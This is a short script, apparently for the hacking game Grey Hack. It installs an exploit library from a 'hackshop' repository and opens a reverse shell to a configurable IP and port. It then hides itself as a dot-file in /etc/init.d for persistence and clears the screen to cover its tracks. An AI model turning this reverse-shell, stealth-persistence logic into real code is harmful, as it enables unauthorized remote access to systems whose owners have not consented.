clear_screen
hackshopIp = ""
rshellIp = ""
rshellPort = 
rshellProcName = ""
aptclient = include_lib("/lib/aptclient.so")
if not aptclient then aptclient = include_lib(current_path + "/aptclient.so")
if aptclient then
    aptclient.add_repo(hackshopIp)
    aptclient.install("metaxploit.so")
end if
metaxploit = include_lib("/lib/metaxploit.so")
if not metaxploit then exit(clear_screen)
metaxploit.rshell_client(rshellIp, rshellPort, rshellProcName)
autoexecFolder = get_shell.host_computer.File("/etc/init.d")
if not autoexecFolder then exit(clear_screen)
thisProgram = get_shell.host_computer.File(program_path)
if not thisProgram then exit(clear_screen)
autoexecFile = get_shell.host_computer.File(autoexecFolder.path + "/." + rshellProcName)
if autoexecFile then exit(clear_screen)
thisProgram.move(autoexecFolder.path, "." + rshellProcName)
exit(clear_screen)